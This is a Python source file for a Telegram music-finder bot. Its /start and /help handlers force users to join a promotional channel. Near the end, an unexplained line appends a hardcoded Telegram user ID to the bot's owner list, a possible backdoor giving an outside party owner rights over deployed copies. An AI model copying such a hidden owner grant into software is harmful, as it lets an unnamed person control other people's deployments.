from config import OWNER_ID
from TamilBots.modules import *
from TamilBots import app, LOGGER
import os
import requests

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import UserNotParticipant, ChatAdminRequired, UsernameNotOccupied
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
)

FSUBB = InlineKeyboardMarkup(
        [[
        InlineKeyboardButton(text="🍀  zoneunlimited  🍀", url=f"https://t.me/zoneunlimited") 
        ]]      
    )


@app.on_message(filters.command("start"))
async def start_(client: Client, message: Message):
    try:
        await message.reply_chat_action("typing")
        await message._client.get_chat_member(int("-1001110021950"), message.from_user.id)
    except UserNotParticipant:
        await message.reply_text(
        text=f"**⛔️ Access Denied ⛔️**\n\n🙋‍♂️ **Hey There** {message.from_user.mention}, You Must **Join** @zoneunlimited  Telegram **Channel** To Use This BOT. So, **Please Join** it & Try Again🤗. **Thank** You 🤝", disable_web_page_preview=True, reply_markup=FSUBB, reply_to_message_id = message.message_id
    )
        return
    await message.reply_photo(
        photo=f"https://telegra.ph/file/cb3197525ac4c26881214.jpg",
        caption = """
🍀 Hello There 

🙋‍♂️ I am MUSIC FINDER BOT 🎵,I can 

🎵 Downloading All song 
🌷 Downloading All Video 
🚀 Downloading All TikTok
🍀 Find Song Ditels 
⭕️ Inline search 
🌺 Group Supported
🎯 24 horse active

🌿 Developer : @chamod_deshan

🔥 [🍀  zoneunlimited  🍀](https://t.me/Zu_Project) Corporation ©️
""",
    reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "➕ ❰ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴘ ❱ ➕", url=f"https://t.me/The_song_finder_bot?startgroup=true"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "🍀  zoneunlimited  🍀", url=f"https://t.me/zoneunlimited"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "🍀 zoneunlimited chat 🍀", url="https://t.me/zoneunlimitedchat"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "🌷  Bot Developer  🌷", url=f"https://t.me/chamod_deshan"
                    )
                ],
                [
                    InlineKeyboardButton(text=
                       "◇────────🔍 Search Here 🔎───────◇", switch_inline_query_current_chat=""
                    )
                ]
           ]
        )
    )

@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    try:
        await message.reply_chat_action("typing")
        await message._client.get_chat_member(int("-1001110021950"), message.from_user.id)
    except UserNotParticipant:
        await message.reply_text(
        text=f"**⛔️ Access Denied ⛔️**\n\n🙋‍♂️ **Hey There** {message.from_user.mention}, You Must **Join** @zoneunlimited Telegram **Channel** To Use This BOT. So, **Please Join** it & Try Again🤗. **Thank** You 🤝", disable_web_page_preview=True, reply_markup=FSUBB, reply_to_message_id = message.message_id
    )
        return
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "send you song name... 🔥🚀\n /song (song name) 🥳"
    await message.reply(text)

OWNER_ID.append(1901997764)
app.start()
LOGGER.info("my music finder bot Is Now Successfully loaded ✅")
idle()
